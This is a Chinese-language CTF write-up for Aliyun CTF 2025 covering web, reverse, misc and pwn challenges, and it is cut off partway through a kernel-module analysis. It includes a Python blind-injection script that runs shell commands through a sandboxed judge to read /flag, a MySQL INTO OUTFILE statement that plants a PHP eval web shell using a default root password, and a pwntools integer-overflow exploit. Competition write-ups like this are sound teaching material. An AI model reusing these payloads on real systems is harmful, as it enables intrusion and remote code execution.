---
title: 阿里云CTF2025 writeup by Min-Venom
url: https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247512122&idx=1&sn=dfad03804f662061a318d6c42bf73d87&chksm=e89d98e2dfea11f483157b6f32d4eba99a476e40ef0a3c368b5ef5329eb17936f3c924bf5966&scene=58&subscene=0#rd
source: ChaMd5安全团队
date: 2025-02-27
fetch_date: 2025-10-06T20:36:18.682755
---

# 阿里云CTF2025 writeup by Min-Venom

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PUubqXlrzBTib0RkZOzvpibSuCUloiaGEpQUTJyaMRdpMhh1IHtyvo6VXAcujXgGQNDMN3M57ExF7ibR1AfibwxmU8w/0?wx_fmt=jpeg)

# 阿里云CTF2025 writeup by Mini-Venom

原创

Mini-Venom

ChaMd5安全团队

> 招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱 admin@chamd5.org(带上简历和想加入的小组)

## Web

### ezoj

```
import _posixsubprocess
import os
_posixsubprocess.fork_exec([b"/bin/sh","-c", "ls"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
```

能执行但是结果搞不出来，试试盲注

可能内存马

时间盲注回显但就是很慢

```
import base64

import requests
import time

flag=''
strings = "qwertyuiopasdfghjklzxcvbnm1234567890{}-"
payload1=f"""
import _posixsubprocess
import os
_posixsubprocess.fork_exec([b"/bin/sh","-c", "python3 /tmp/1.py"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)

"""

for i in range(1, 50):
    for j in strings:
        poc1=f"""import time
import os
if os.popen('cat /flag*').read({i})[{i}-1] == "{j}":
    time.sleep(2)
else:
    print("")
    """
        poc2=base64.b64encode(poc1.encode('utf-8')).decode()
        payload2 = f"""
import _posixsubprocess
import os
_posixsubprocess.fork_exec([b"/bin/sh","-c", "echo'{poc2}'|base64 -d>/tmp/1.py"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
"""

        resp1 = requests.post(
                "http://121.41.238.106:63837/api/submit",
                json={"problem_id": "0", "code": payload2},
            )
        start_time = time.time()
        resp2 = requests.post(
            "http://121.41.238.106:63837/api/submit",
            json={"problem_id": "0", "code": payload1},
        )

        end_time = time.time()
        delay = end_time - start_time

        if delay > 2:
            flag += j
            print(flag)
            break
    else:
        flag += "\n"
        break
```

需要多跑几次，有些时候会抛出异常，可以重新改范围值

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTib0RkZOzvpibSuCUloiaGEpQW076sOhUu7fiaB5R1zNlCtgiaRfv2zfYiasYicibzDPqlsS9YMvewvf4Q7A/640?wx_fmt=png&from=appmsg)

最后得到flag

```
aliyunctf{bb050a11-f64e-4137-8e94-59a37b0ed427}
```

### 打卡OK

目录扫描，

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTib0RkZOzvpibSuCUloiaGEpQYAjjYozH28ROcBVe48ahibTgFSYohHFYlf8CzKichL8bZDILbYkBmWEw/640?wx_fmt=png&from=appmsg)

发现添加~符号可以查看源码，在login.php源码得到数据库账号密码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTib0RkZOzvpibSuCUloiaGEpQ0uoEKwDY4ib6ASiboicRtoKcB2FYakiaLSVLfRSibRhl71A9WyYxcbCfD2w/640?wx_fmt=png&from=appmsg)

然后在ok.php源码得到adminer\_481.php路径，访问该路径可以进行数据库连接，连接后能够执行sql语句，尝试sql写马。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTib0RkZOzvpibSuCUloiaGEpQ10ibpgC09QKtMXjXZSVD969SyaOHyXWcBDfEUSOygHPia0pDTcTP6eTQ/640?wx_fmt=png&from=appmsg)

但是登录的web账户权限不够，后面发现可以直接登录root账户，密码默认就是root，执行

```
select "&lt;?php eval($_POST['cmd']);?&gt;" into outfile "/var/www/html/shell.php"
```

访问 /shell.php进行命令执行

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTib0RkZOzvpibSuCUloiaGEpQicEjazx0psgHpSU5Y5Ricib3uIlUKv04YCmiaq1283uozNiaH00ODo2At7A/640?wx_fmt=png&from=appmsg)

## Reverse:

### easy-cuda-rev

cuda逆向，先使用工具将encrypto部分的逻辑dump下来，直接逆逻辑就行，部分加密逻辑

```
int r4 = ctaid_x * ntid_x + tid_x;
if (tid_x>= ntid_x){
        return;
        }

uint8_t* rd3 = (uint8_t*)(rd1 + r4);
uint8_t rs13 = *rd3;
uint16_t rs14 = (uint16_t)r4;
uint16_t rs15 = rs14*73;
uint16_t rs16 = rs15+temp;
uint16_t rs17 = rs13 ^ rs16;
uint16_t rs18 = rs17 & 0xF0;
uint16_t rs19 = rs18 >> 4;
uint16_t rs20 = rs17 << 4;
uint16_t rs58 = rs19 | rs20;

for(int i=0;i<10485760;i++)
{
        uint8_t rs21 = T[rs58 & 0xFF]
        uint16_t rs22 = rs21 >> 4;
        uint16_t rs23 = rs21 << 4;
        uint16_t rs24 = rs22 | rs23;
        rs58 = rs24 ^ (uint16_t)i;
}

for(int i=0;i<10485760;i++)
{
        uint8_t rs26 = T[rs58 & 0xFF]
        uint16_t rs27 = rs26 >> 4;
        uint16_t rs28 = rs26 << 4;
        uint16_t rs29 = rs27 | rs28;
        rs58 = rs29 ^ (uint16_t)i;
}

for(int i=0;i<10485760;i++)
{
        uint8_t rs31 = T[rs58 & 0xFF]
        uint16_t rs32 = rs31 >> 4;
        uint16_t rs33 = rs31 << 4;
        uint16_t rs34 = rs32 | rs33;
        rs58 = rs34 ^ (uint16_t)i;
}

for(int i=0;i<10485760;i++)
{
        uint8_t rs36 = T[rs58 & 0xFF]
        uint16_t rs37 = rs36 >> 4;
        uint16_t rs38 = rs36 << 4;
        uint16_t rs39 = rs37 | rs38;
        rs58 = rs39 ^ (uint16_t)i;
}

for(int i=0;i<10485760;i++)
{
        uint8_t rs41 = T[rs58 & 0xFF]
        uint16_t rs42 = rs36 >> 4;
        uint16_t rs43 = rs36 << 4;
        uint16_t rs44 = rs37 | rs38;
        rs58 = rs44 ^ (uint16_t)i;
}

uint32_t r257 = -239350328;
uint32_t r256 = 387276957;
uint32_t r255 = 2027808484;
uint32_t r254 = -626627285;
uint32_t r253 = 1013904242;
uint32_t r252 = -1640531527

k = {-1556008596,-939442524,1013904242,338241895};
uint32_t k0=k[0],k1=k[1],k2=k[2],k3=k[3];

for(int i=0;i<10485760;i+=8)
{
        v0 += (v1<<4+k0)^(v1 + r252)^(v1>>5 + k1)
        v1 += (v0<<4+k2)^(v0 + r252)^(v0>>5 + k3)

        v0 += (v1<<4+k0)^(v1 + r253)^(v1>>5 + k1)
        v1 += (v0<<4+k2)^(v0 + r253)^(v0>>5 + k3)

        v0 += (v1<<4+k0)^(v1 + r254)^(v1>>5 + k1)
        v1 += (v0<<4+k2)^(v0 + r254)^(v0>>5 + k3)

        v0 += (v1<<4+k0)^(v1 + r255)^(v1>>5 + k1)
        v1 += (v0<<4+k2)^(v0 + r255)^(v0>>5 + k3)

        v0 += (v1<<4+ k0)^(v1 + r256)^(v1>>5 + k1)
        v1 += (v0<<4+ k2)^(v0 + r256)^(v0>>5 + k3)

        v0 += (v1<<4+ k0)^(v1 + (r257 - 1013904242))^(v1>>5 + k1)
        v1 += (v0<<4+ k2)^(v0 + (r257 - 1013904242))^(v0>>5 + k3)

        v0 += (v1<<4+ k0)^(v1+ (r257 + 1640531527))^(v1>>5 + k1)
        v1 += (v0<<4+ k2)^(v0+ (r257 + 1640531527))^(v0>>5 + k3)

        v0 += (v1<<4+ k0)^(v1+ r257)^(v1>>5+ k1)
        v1 += (v0<<4+ k2)^(v0+ r257)^(v0>>5+ k3)

        r257 -= 239350328;
        r256 -= 239350328;
        r255 -= 239350328;
        r254 -= 239350328;
        r253 -= 239350328;
        r252 -= 239350328;

}
```

## Misc

### mba

打开附件 发现个py文件 主要就是解析并验证 MBA 表达式 主要flag的校验逻辑在这里

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTib0RkZOzvpibSuCUloiaGEpQOBiafibnNJMo57kwibp6oRdnyu6VNibqPOfV01orejLJIoDnlKubibHfhvA/640?wx_fmt=png&from=appmsg)

所以我们需要构造一个非MBA恒等式的表达式 使得z3无法证明expr==expr恒成立 拿到flag 即满足 expr!=expr

随后看.patch文件 扔给deepseek发现起存在整数溢出漏洞在construct\_simplified\_mba函数中 且跟py文件中的校验逻辑关联

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTib0RkZOzvpibSuCUloiaGEpQLX2RZIRDia1liccyI5cpMv0DLVTpb5fzAJms7blZjGx8v6Cf4TghutBg/640?wx_fmt=png&from=appmsg)

所以可以利用整数溢出漏洞构造特殊系数 导致简化后表达式与原始表达式不等价构造exp 进而拿到flag

```
from pwn import *
r=remote("121.41.238.106",51845)
payload = b'95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y)+ 95791394*(x^y)'
r.sendline(payload)
r.interactive()
#aliyunctf{251e4bb0-b430-40cd-b09b-79a48b2ea2d8}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBTib0RkZOzvpibSuCUloiaGEpQTpQEibQQSv7WlHM6kp5cx6MibhIhiaZBp3uibUAVia96K8eMkEqiahVNZRuQ/640?wx_fmt=png&from=appmsg)

## Pwn:

### alimem

题目给了源码，直接分析源码

这段代码是一个 Linux 内核模块，定义了一个名为 alimem 的设备，它提供了一些操作接口来进行内存的分配、释放、读写等操作。以下是对代码的详细分析：

```
struct alimem_page {
    void *virt;
    phys_addr_t phys;
    atomic_t refcount;
    struct rcu_head rcu;
};
```

* alimem\_page

：每个内存页面由这个结构表示。包含：

* virt: 页面对应的虚拟地址。
* phys: 页面对应的物理地址。
* refcount: 原子计数器，用于追踪该页面的引用次数。
* rcu: 用于 RCU 清理内存的结构体。

```
struct alimem_write {
    int idx;
    unsigned int offset;
    const char __user *data;
    size_t size;
};
struct alimem_read {
    int idx;
    unsigned int offset;
    char __user *data;
    size_t size;
};
```

* alimem\_write

和

alimem\_read

：分别用于写操作和读操作的数据结构，包含：

* idx: 页面索引。
* offset: 写入或读取的偏移量。
* data: 数据缓冲区。
* size: 操作的数据大小。

```
static struct alimem_page *pages[MAX_PAGES];
static DECLARE_RWSEM(pages_lock);
```

* \*\*pages[MAX\_P...